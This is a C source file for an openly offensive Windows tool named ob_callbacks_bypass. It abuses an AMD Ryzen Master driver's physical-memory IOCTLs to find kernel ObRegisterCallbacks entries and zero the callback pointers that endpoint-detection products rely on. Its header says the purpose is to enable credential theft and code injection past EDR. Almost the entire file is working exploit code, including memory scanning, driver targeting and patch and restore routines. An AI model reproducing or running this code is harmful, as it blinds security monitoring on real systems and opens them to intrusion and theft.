/*
 * ob_callbacks_bypass.c â€” Disable ObRegisterCallbacks (object handle interception)
 *
 * EDRs call ObRegisterCallbacks to insert Pre/Post callbacks into the
 * _OBJECT_TYPE.CallbackList for PsProcessType and PsThreadType.
 * These fire on EVERY OpenProcess / OpenThread / DuplicateHandle call:
 *
 *   OpenProcess(PROCESS_ALL_ACCESS, ..., victim_pid)
 *   â†’ ObpPreInterceptHandleCreate fires
 *   â†’ EDR PreOperation callback strips access bits:
 *       DesiredAccess &= ~(PROCESS_VM_READ | PROCESS_VM_WRITE |
 *                          PROCESS_SUSPEND_RESUME | PROCESS_CREATE_THREAD)
 *   â†’ returned handle has only PROCESS_QUERY_INFORMATION
 *   â†’ NtReadVirtualMemory / WriteProcessMemory â†’ ACCESS_DENIED
 *
 * This defeats credential theft, code injection, and process inspection
 * even after Ps* notify callbacks and minifilter callbacks are cleared.
 *
 * â”€â”€ Structure layout â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * Each ObRegisterCallbacks call creates one _OB_CALLBACK_ENTRY per registered
 * OBJECT_TYPE per OB_OPERATION_REGISTRATION.  Pool tag: 'CblE' (NonPagedPool).
 *
 *   _OB_CALLBACK_ENTRY (Win10 1903 â€“ Win11 24H2, x64):
 *     +0x000  CallbackList    LIST_ENTRY          links into _OBJECT_TYPE.CallbackList
 *     +0x010  Operations      ULONG               1=Create 2=Duplicate 3=Both
 *     +0x014  Enabled         ULONG               non-zero = active
 *     +0x018  Registration    PVOID               pool: _CALLBACK_REGISTRATION parent
 *     +0x020  ObjectType      POBJECT_TYPE        which type (Process / Thread)
 *     +0x028  PreOperation    POB_PRE_OPERATION_CALLBACK   â† zeroed to disable
 *     +0x030  PostOperation   POB_POST_OPERATION_CALLBACK  â† zeroed to disable
 *
 * ntoskrnl null-checks PreOperation/PostOperation before calling:
 *   if (Entry->PreOperation != NULL) Entry->PreOperation(&ctx, ObjType, Info);
 * â†’ zeroing them is safe, no BSOD risk.
 *
 * â”€â”€ Physical memory scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * We scan all physical memory with the PreOperation pointer as anchor.
 * 8 guards eliminate false positives:
 *
 *   1. PreOperation is in a known loaded driver (not ntoskrnl itself)
 *   2. PreOperation RVA < 4 MB  (code section sanity)
 *   3. PostOperation is NULL or in same driver, RVA < 4 MB
 *   4. PreOperation != PostOperation
 *   5. Operations ULONG is 1, 2, or 3
 *   6. Enabled ULONG non-zero, high 3 bytes == 0 (it's a BOOL-sized field)
 *   7. Registration is a kernel VA not inside any loaded image (pool object)
 *   8. ObjectType  is a kernel VA not inside any loaded image (pool object)
 *   9. CallbackList Flink/Blink are 8-aligned kernel VAs
 *
 * Object type identity:
 *   PsProcessType and PsThreadType are exported from ntoskrnl.
 *   We read the _OBJECT_TYPE* they point to from physical memory and compare
 *   each entry's ObjectType VA to label entries as "Process" or "Thread".
 *
 * â”€â”€ PatchGuard note â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 *
 * _OB_CALLBACK_ENTRY lives in NonPaged pool â€” NOT inside ntoskrnl .text/.data.
 * PatchGuard protects ntoskrnl code/data sections, not arbitrary pool memory.
 * Zeroing pool pointers is PatchGuard-safe.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o ob_callbacks_bypass.exe \
 *       ob_callbacks_bypass.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* â”€â”€ Driver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* â”€â”€ Physical I/O â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in_buf[12];
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    uint32_t out_sz=12+sz;
    uint8_t *out=(uint8_t*)calloc(1,out_sz); if(!out) return 0;
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in_buf,12,out,out_sz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(out); return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t in_sz=12+sz;
    uint8_t *in_buf=(uint8_t*)malloc(in_sz); if(!in_buf) return 0;
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    memcpy(in_buf+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in_buf,in_sz,NULL,0,&got,NULL);
    free(in_buf); return ok;
}

/* â”€â”€ Module list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

/* â”€â”€ Kernel module map â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_MODS 256
typedef struct { uint64_t base,size; char name[64]; } KMod;
static KMod g_mods[MAX_MODS];
static int  g_nmods=0;

static void load_module_map(void)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return;
    for(ULONG i=0;i<ml->NumberOfModules&&g_nmods<MAX_MODS;i++){
        g_mods[g_nmods].base=(uint64_t)ml->Modules[i].ImageBase;
        g_mods[g_nmods].size=ml->Modules[i].ImageSize;
        const char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        strncpy(g_mods[g_nmods].name,fn,63); g_mods[g_nmods].name[63]='\0';
        g_nmods++;
    }
    free(ml);
}

/* va_to_driver: name if va is in a non-ntoskrnl loaded driver (index >= 1). */
static const char *va_to_driver(uint64_t va)
{
    for(int i=1;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size)
            return g_mods[i].name;
    return NULL;
}

static const char *va_to_driver_ex(uint64_t va, uint64_t *rva_out)
{
    for(int i=1;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size){
            if(rva_out) *rva_out=va-g_mods[i].base;
            return g_mods[i].name;
        }
    return NULL;
}

/* va_in_any_module: true if va is inside ANY loaded image (incl. ntoskrnl).
 * Used to verify pool pointers are NOT inside image space. */
static int va_in_any_module(uint64_t va)
{
    for(int i=0;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size) return 1;
    return 0;
}

/* â”€â”€ Driver classification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef enum { DRV_SYSTEM, DRV_NETWORK, DRV_VM, DRV_OTHER } DrvClass;

static DrvClass classify_driver(const char *name)
{
    static const char *sys_list[] = {
        "Ntfs.sys","FLTMGR.SYS","fileinfo.sys","Wof.sys","refs.sys",
        "FastFat.sys","exfat.sys","cdfs.sys","udfs.sys","rdbss.sys",
        "luafv.sys","volmgrx.sys","volmgr.sys","disk.sys","storport.sys",
        "classpnp.sys","CLFS.SYS","fvevol.sys","iorate.sys",
        "win32kfull.sys","win32kbase.sys","ksecdd.sys","cng.sys",
        "WindowsTrustedRT.sys","WindowsTrustedRTProxy.sys",
        "werkernel.sys","pcw.sys","DxgKrnl.sys","dxgmms2.sys",NULL
    };
    static const char *net_list[] = {
        "tcpip.sys","HTTP.sys","msquic.sys","tdx.sys","afd.sys",
        "netbt.sys","ndis.sys","netio.sys","pacer.sys",NULL
    };
    static const char *vm_list[] = {
        "vmhgfs.sys","vmmemctl.sys","vmxnet3nd.sys","vmci.sys",
        "vmbus.sys","hvsocket.sys","hvnetvsc.sys",
        "VBoxGuest.sys","VBoxMouse.sys","VBoxSF.sys",NULL
    };
    for(int i=0;sys_list[i];i++) if(_stricmp(name,sys_list[i])==0) return DRV_SYSTEM;
    for(int i=0;net_list[i];i++) if(_stricmp(name,net_list[i])==0) return DRV_NETWORK;
    for(int i=0;vm_list[i];i++)  if(_stricmp(name,vm_list[i])==0)  return DRV_VM;
    return DRV_OTHER;
}

static const char *drv_class_label(DrvClass c)
{
    switch(c){
        case DRV_SYSTEM:  return "[SYS  !!DO-NOT-ZERO!!]";
        case DRV_NETWORK: return "[NET  skip]";
        case DRV_VM:      return "[VM   skip]";
        default:          return "[EDR? target]";
    }
}

/* â”€â”€ PE export RVA lookup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;

    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}\
    }while(0)

    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* â”€â”€ Find ntoskrnl PA via 2MB NtBuildNumber scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define CHUNK_SIZE 0x10000
static uint8_t g_chunk[CHUNK_SIZE];

static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber");
    free(pe); if(!rva) return 0;

    /* KUSER_SHARED_DATA.NtBuildNumber â€” stable Windows ABI at 0x7FFE0260 */
    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;
    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva,4)) continue;
            uint32_t val=0; phys_read(pa+rva,&val,4);
            if(val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if(mz==0x5A4D) return pa;
        }
    }
    return 0;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Object callback entry structures
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

#define MAX_SANE_RVA  0x400000ULL   /* 4 MB â€” max sane code RVA */
#define MAX_OB_ENTRIES 256

typedef struct {
    uint64_t struct_pa;             /* PA of the start of _OB_CALLBACK_ENTRY */
    uint64_t preop_pa;              /* PA of PreOperation pointer (struct+0x28) */
    uint64_t postop_pa;             /* PA of PostOperation pointer (struct+0x30) */
    uint64_t preop_va;              /* original PreOperation value */
    uint64_t postop_va;             /* original PostOperation value */
    uint64_t objtype_va;            /* ObjectType pointer value (struct+0x20) */
    uint64_t reg_va;                /* Registration pointer value (struct+0x18) */
    uint32_t operations;            /* 1=Create 2=Dup 3=Both */
    char     driver[64];            /* short name of driver owning preop fn */
    uint8_t  orig_preop[8];         /* saved for restore */
    uint8_t  orig_postop[8];        /* saved for restore */
    int      zeroed;
} ObEntry;

static ObEntry g_entries[MAX_OB_ENTRIES];
static int     g_n_entries = 0;

/* Known _OBJECT_TYPE* VAs for Process and Thread â€” read from ntoskrnl at runtime */
static uint64_t g_proc_type_va   = 0;
static uint64_t g_thread_type_va = 0;

static const char *objtype_label(uint64_t va)
{
    if (g_proc_type_va   && va == g_proc_type_va)   return "Process";
    if (g_thread_type_va && va == g_thread_type_va) return "Thread";
    return "Unknown";
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Stage 1 â€” physical memory scan for _OB_CALLBACK_ENTRY
 *
 * Scan anchor: PreOperation pointer at struct offset +0x028.
 * We also try +0x020 as a secondary anchor for builds where the
 * Registration/ObjectType ordering may differ.
 *
 * Offsets relative to anchor (off = PreOperation position in chunk):
 *   off - 0x28: CallbackList.Flink
 *   off - 0x20: CallbackList.Blink
 *   off - 0x18: Operations (ULONG)
 *   off - 0x14: Enabled   (ULONG)
 *   off - 0x10: Registration (PVOID)
 *   off - 0x08: ObjectType   (PVOID)
 *   off + 0x00: PreOperation â† anchor
 *   off + 0x08: PostOperation
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

static int try_ob_entry(uint64_t cpa, uint64_t off, uint64_t csz, uint8_t anchor)
{
    if (off < (uint64_t)anchor || off + 0x10 > csz) return 0;

    uint64_t preop  = *(uint64_t*)(g_chunk + off);
    uint64_t postop = *(uint64_t*)(g_chunk + off + 0x08);

    /* Guard 1+2: PreOperation in known driver, RVA sane */
    uint64_t pre_rva = 0;
    const char *pre_drv = va_to_driver_ex(preop, &pre_rva);
    if (!pre_drv) return 0;
    if (pre_rva == 0 || pre_rva >= MAX_SANE_RVA) return 0;

    /* Guard 3+4: PostOperation null or same driver; distinct from preop */
    if (postop) {
        uint64_t post_rva = 0;
        const char *post_drv = va_to_driver_ex(postop, &post_rva);
        if (!post_drv || strcmp(post_drv, pre_drv) != 0) return 0;
        if (post_rva == 0 || post_rva >= MAX_SANE_RVA) return 0;
        if (preop == postop) return 0;
    }

    /* Guard 5: Operations must be 1, 2, or 3 */
    uint32_t ops = *(uint32_t*)(g_chunk + off - 0x18);
    if (ops < 1 || ops > 3) return 0;

    /* Guard 6: Enabled non-zero, high 3 bytes zero (BOOL-sized ULONG field) */
    uint32_t enabled = *(uint32_t*)(g_chunk + off - 0x14);
    if (enabled == 0) return 0;
    if ((enabled >> 8) != 0) return 0;

    /* Guard 7: Registration â€” kernel VA, NOT inside any loaded module (pool) */
    uint64_t reg = *(uint64_t*)(g_chunk + off - 0x10);
    if ((reg >> 48) != 0xFFFFULL) return 0;
    if (va_in_any_module(reg)) return 0;
    if (reg & 7) return 0;

    /* Guard 8: ObjectType â€” kernel VA, NOT inside any loaded module */
    uint64_t otype = *(uint64_t*)(g_chunk + off - 0x08);
    if ((otype >> 48) != 0xFFFFULL) return 0;
    if (va_in_any_module(otype)) return 0;
    if (otype & 7) return 0;

    /* Guard 9: CallbackList Flink/Blink â€” 8-aligned kernel VAs */
    uint64_t flink = *(uint64_t*)(g_chunk + off - (uint64_t)anchor);
    uint64_t blink = *(uint64_t*)(g_chunk + off - (uint64_t)anchor + 0x08);
    if ((flink >> 48) != 0xFFFFULL) return 0;
    if ((blink >> 48) != 0xFFFFULL) return 0;
    if (flink & 7) return 0;
    if (blink & 7) return 0;
    /* flink/blink should not point into any driver image either */
    if (va_in_any_module(flink)) return 0;
    if (va_in_any_module(blink)) return 0;

    /* Dedup: preop_pa already recorded? */
    uint64_t preop_pa = cpa + off;
    for (int i = 0; i < g_n_entries; i++)
        if (g_entries[i].preop_pa == preop_pa) return 0;
    if (g_n_entries >= MAX_OB_ENTRIES) return 0;

    ObEntry *e = &g_entries[g_n_entries++];
    e->struct_pa  = cpa + off - (uint64_t)anchor;
    e->preop_pa   = preop_pa;
    e->postop_pa  = preop_pa + 0x08;
    e->preop_va   = preop;
    e->postop_va  = postop;
    e->objtype_va = otype;
    e->reg_va     = reg;
    e->operations = ops;
    strncpy(e->driver, pre_drv, 63); e->driver[63] = '\0';
    e->zeroed = 0;
    return 1;
}

static void scan_physical(void)
{
    g_n_entries = 0;
    uint64_t last_prog = 0;
    /*
     * Two anchor offsets for PreOperation within _OB_CALLBACK_ENTRY:
     *   0x28 â€” standard layout Win10 1903 â€“ Win11 (most builds)
     *   0x20 â€” rare variant (no Enabled/Registration fields, or reordered)
     */
    const uint8_t anchors[] = {0x28, 0x20};

    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t rend = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t cpa = g_ranges[ri].base; cpa < rend; cpa += CHUNK_SIZE) {
            if (g_n_entries >= MAX_OB_ENTRIES) goto done;
            if (cpa - last_prog >= 0x80000000ULL) {
                printf("  [%5llu MB] found=%d\r",
                       (unsigned long long)(cpa >> 20), g_n_entries);
                fflush(stdout);
                last_prog = cpa;
            }
            uint64_t csz = rend - cpa;
            if (csz > CHUNK_SIZE) csz = CHUNK_SIZE;
            if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;

            /* Scan at 8-byte alignment (function pointers are 8-byte aligned) */
            for (uint64_t off = 0x28; off + 0x10 <= csz && g_n_entries < MAX_OB_ENTRIES; off += 8)
                for (int ai = 0; ai < 2; ai++)
                    if (try_ob_entry(cpa, off, csz, anchors[ai])) break;
        }
    }
done:;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Stage 2 â€” group by driver + display
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

typedef struct {
    char     driver[64];
    DrvClass cls;
    int      indices[MAX_OB_ENTRIES]; /* indices into g_entries */
    int      n;
    int      selected;
} ObGroup;

#define MAX_GROUPS 64
static ObGroup g_groups[MAX_GROUPS];
static int     g_n_groups = 0;

static void build_groups(void)
{
    g_n_groups = 0;
    for (int i = 0; i < g_n_entries; i++) {
        int found = 0;
        for (int g = 0; g < g_n_groups; g++) {
            if (_stricmp(g_groups[g].driver, g_entries[i].driver) == 0) {
                if (g_groups[g].n < MAX_OB_ENTRIES)
                    g_groups[g].indices[g_groups[g].n++] = i;
                found = 1;
                break;
            }
        }
        if (!found && g_n_groups < MAX_GROUPS) {
            ObGroup *grp = &g_groups[g_n_groups++];
            strncpy(grp->driver, g_entries[i].driver, 63); grp->driver[63] = '\0';
            grp->cls       = classify_driver(grp->driver);
            grp->n         = 1;
            grp->selected  = 0;
            grp->indices[0] = i;
        }
    }
}

static void print_groups(void)
{
    printf("    %-4s %-28s %-9s %-7s %-7s %s\n",
           "#","Driver","Entries","Process","Thread","Class");
    printf("    %.*s\n", 80,
           "--------------------------------------------------------------------------------");
    for (int g = 0; g < g_n_groups; g++) {
        ObGroup *grp = &g_groups[g];
        int n_proc = 0, n_thrd = 0;
        for (int k = 0; k < grp->n; k++) {
            ObEntry *e = &g_entries[grp->indices[k]];
            if (e->objtype_va == g_proc_type_va)   n_proc++;
            if (e->objtype_va == g_thread_type_va) n_thrd++;
        }
        printf("    [%2d] %-28s %-9d %-7d %-7d %s\n",
               g + 1, grp->driver, grp->n, n_proc, n_thrd,
               drv_class_label(grp->cls));
        /* Show unique callbacks per group */
        uint64_t shown[16]; int ns = 0;
        for (int k = 0; k < grp->n; k++) {
            ObEntry *e = &g_entries[grp->indices[k]];
            int dup = 0;
            for (int j = 0; j < ns; j++) if (shown[j] == e->preop_va) { dup=1; break; }
            if (dup) continue;
            if (ns < 16) shown[ns++] = e->preop_va;
            uint64_t drv_base = 0;
            for (int m = 1; m < g_nmods; m++)
                if (_stricmp(g_mods[m].name, grp->driver) == 0) { drv_base=g_mods[m].base; break; }
            const char *ops_str = e->operations==1?"Create":e->operations==2?"Dup":"Create+Dup";
            printf("         â†’ %s+0x%llX  [%s]  obj=%s\n",
                   grp->driver,
                   (unsigned long long)(drv_base ? e->preop_va - drv_base : e->preop_va),
                   ops_str,
                   objtype_label(e->objtype_va));
        }
        printf("\n");
    }
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Disable / Restore
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
static volatile int g_any_zeroed = 0;

static void disable_group(ObGroup *grp)
{
    int ok = 0, fail = 0;
    uint64_t z8 = 0;

    for (int k = 0; k < grp->n; k++) {
        ObEntry *e = &g_entries[grp->indices[k]];

        /* Save originals */
        if (!phys_read(e->preop_pa,  e->orig_preop,  8)) { fail++; continue; }
        if (!phys_read(e->postop_pa, e->orig_postop, 8)) { fail++; continue; }

        /* Zero PreOperation */
        int preop_ok = phys_write(e->preop_pa, &z8, 8);
        /* Zero PostOperation only if non-null */
        int postop_ok = (e->postop_va == 0) ? 1 : phys_write(e->postop_pa, &z8, 8);

        if (preop_ok && postop_ok) {
            e->zeroed = 1;
            ok++;
        } else {
            fail++;
            printf("    [!] write failed at PA=0x%016llX\n",
                   (unsigned long long)e->preop_pa);
        }
    }
    printf("    Disabled: %d  Failed: %d\n", ok, fail);
    if (ok > 0) g_any_zeroed = 1;
}

static void restore_group(ObGroup *grp)
{
    for (int k = 0; k < grp->n; k++) {
        ObEntry *e = &g_entries[grp->indices[k]];
        if (!e->zeroed) continue;
        /* Restore PreOperation if still zeroed */
        uint64_t cur = 0;
        if (phys_read(e->preop_pa, &cur, 8) && cur == 0)
            phys_write(e->preop_pa, e->orig_preop, 8);
        /* Restore PostOperation if non-null original and still zeroed */
        if (e->postop_va) {
            cur = 0;
            if (phys_read(e->postop_pa, &cur, 8) && cur == 0)
                phys_write(e->postop_pa, e->orig_postop, 8);
        }
        e->zeroed = 0;
    }
}

static void do_restore_all(void)
{
    if (!g_any_zeroed) return;
    printf("\n[R] Restoring ObRegisterCallbacks entries...\n");
    for (int g = 0; g < g_n_groups; g++)
        if (g_groups[g].selected) restore_group(&g_groups[g]);
    g_any_zeroed = 0;
    printf("[R] Done.\n\n");
}

